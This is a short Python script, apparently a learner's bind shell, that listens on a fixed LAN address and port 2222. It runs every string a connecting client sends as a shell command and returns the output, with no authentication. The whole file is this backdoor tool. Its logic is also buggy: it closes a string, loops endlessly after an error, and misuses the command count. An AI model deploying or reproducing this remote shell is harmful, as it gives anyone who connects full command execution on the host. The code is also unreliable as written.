#!/usr/bin/env python

import socket
import subprocess
import threading
import sys
bind_ip="192.168.43.33"
bind_port=2222
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((bind_ip,bind_port))
command=int(input("HOW MANY COMMAND YOU WANNA ENTER:"))
s.listen(command)
print("[*] LISTENING ON %s:%d" %(bind_ip,bind_port))

def handler(client_socket,message):
	while message!='quit':
		try:
			print(f"YOU ONLY HAVE  {command} command =" + message + '\r\n')
			response=subprocess.check_output(message,shell=True)
			client_socket.send(response)
			message=client_socket.recv(4096).decode()
			
		except:
			print("MAYBE WRONG COMMAND")
	message.close()
			

while True:
	
	client,addr=s.accept()
	message=client.recv(4096).decode()
	
	print("[*] ACCEPTED FROM %s:%d" %(addr[0],addr[1]))
	client_handler=threading.Thread(target=handler,args=(client,message,))
	client_handler.start()
	
s.close()



	
	

